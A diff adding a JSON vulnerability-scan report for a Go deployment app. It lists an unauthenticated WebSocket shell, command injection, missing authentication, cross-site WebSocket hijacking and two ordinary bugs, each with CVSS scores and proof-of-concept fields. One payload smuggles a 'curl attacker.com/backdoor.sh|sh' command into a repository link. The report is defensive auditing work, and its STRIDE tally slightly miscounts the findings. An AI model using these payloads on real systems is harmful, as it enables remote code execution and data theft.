@@ -1,0 +1,147 @@
+{
+  "version": "3.0.0",
+  "scan_id": "scan-2026-06-19-162440",
+  "scan_date": "2026-06-19T16:24:40.505Z",
+  "mode": "parallel",
+  "target": "C:\\Users\\INU\\Documents\\app\\ndelok",
+  "files_scanned": 17,
+  "threat_model_loaded": false,
+  "confirmed": [
+    {
+      "id": "BUG-2",
+      "severity": "CRITICAL",
+      "category": "security",
+      "stride": "Spoofing",
+      "cwe": "CWE-306",
+      "file": "backend/handler/terminal.go",
+      "lines": "20-99",
+      "claim": "Unauthenticated WebSocket at /api/terminal provides direct shell access with no auth check and open CORS.",
+      "reachability": "EXTERNAL",
+      "exploitability": "EASY",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "cvss_score": 9.8,
+      "poc": {
+        "payload": "Direct WebSocket connection, no payload needed",
+        "request": "Connect to ws://127.0.0.1:1235/api/terminal",
+        "expected": "Connection rejected or authentication required",
+        "actual": "Interactive bash/cmd shell returned immediately"
+      }
+    },
+    {
+      "id": "BUG-3",
+      "severity": "CRITICAL",
+      "category": "security",
+      "stride": "Tampering",
+      "cwe": "CWE-78",
+      "file": "backend/handler/deploy.go",
+      "lines": "425-426",
+      "claim": "Command injection via github_link — user-controlled input concatenated into shell command string.",
+      "reachability": "EXTERNAL",
+      "exploitability": "EASY",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "cvss_score": 9.8,
+      "poc": {
+        "payload": "githubLink: 'https://x.com/repo;curl attacker.com/backdoor.sh|sh'",
+        "request": "POST /api/deploy/projects with method='github' and malicious githubLink, then connect to deploy stream WS",
+        "expected": "Git clone fails or validates URL",
+        "actual": "Shell executes injected command via sh -c"
+      }
+    },
+    {
+      "id": "BUG-4",
+      "severity": "HIGH",
+      "category": "security",
+      "stride": "Spoofing",
+      "cwe": "CWE-306",
+      "file": "backend/main.go",
+      "lines": "84-117",
+      "claim": "Zero authentication enforcement on any API endpoint except login/register.",
+      "reachability": "EXTERNAL",
+      "exploitability": "EASY",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+      "cvss_score": 6.5,
+      "poc": {
+        "payload": "No auth token required",
+        "request": "GET /api/deploy/projects or POST /api/explorer/save or ws://server/api/terminal",
+        "expected": "Request rejected, 401 Unauthorized",
+        "actual": "Request succeeds, full access granted"
+      }
+    },
+    {
+      "id": "BUG-5",
+      "severity": "MEDIUM",
+      "category": "security",
+      "stride": "Tampering",
+      "cwe": "CWE-346",
+      "file": "backend/handler/plugin.go",
+      "lines": "377-379",
+      "claim": "All WebSocket endpoints accept any origin (CheckOrigin always true), enabling cross-site WebSocket hijacking.",
+      "reachability": "EXTERNAL",
+      "exploitability": "EASY",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+      "cvss_score": 4.3,
+      "poc": {
+        "payload": "HTML page on attacker.com opens WebSocket to ws://target:1235/api/deploy/projects/1/stream",
+        "request": "new WebSocket('ws://target:1235/api/deploy/projects/1/stream')",
+        "expected": "WebSocket connection rejected due to origin mismatch",
+        "actual": "WebSocket connection accepted, deploy log data exfiltrated"
+      }
+    },
+    {
+      "id": "BUG-6",
+      "severity": "MEDIUM",
+      "category": "error-handling",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "file": "backend/handler/deploy.go",
+      "lines": "196-198",
+      "claim": "Errors from scanProjectByID and LastInsertId silently discarded, potentially returning nil projects or stale data in API responses."
+    },
+    {
+      "id": "BUG-7",
+      "severity": "MEDIUM",
+      "category": "logic",
+      "stride": "N/A",
+      "cwe": "N/A",
+      "file": "backend/handler/explorer.go",
+      "lines": "651-677",
+      "claim": "Resource leak in ExplorerUpload: defer file.Close() inside for loop keeps all file handles open until function returns."
+    }
+  ],
+  "dismissed": [
+    {
+      "id": "BUG-1",
+      "severity": "Critical",
+      "category": "security",
+      "file": "backend/handler/explorer.go",
+      "claim": "Path traversal in safeJoin allows reading/writing any file on the system.",
+      "reason": "safeJoin works correctly. On Windows, explorer root is C:\\ (entire C: drive is valid space — C:\\Windows\\win.ini is within bounds). On Unix, '..' in Rel output correctly blocks traversal above home directory. Cross-drive access (D:\\) blocked. Verified via Go sandbox."
+    }
+  ],
+  "dependencies": [],
+  "summary": {
+    "total_reported": 7,
+    "confirmed": 6,
+    "dismissed": 1,
+    "by_severity": {
+      "CRITICAL": 2,
+      "HIGH": 1,
+      "MEDIUM": 3,
+      "LOW": 0
+    },
+    "by_stride": {
+      "Tampering": 1,
+      "InfoDisclosure": 0,
+      "ElevationOfPrivilege": 0,
+      "Spoofing": 2,
+      "DoS": 0,
+      "Repudiation": 0,
+      "N/A": 2
+    },
+    "by_category": {
+      "security": 4,
+      "logic": 1,
+      "error-handling": 1
+    }
+  }
+}
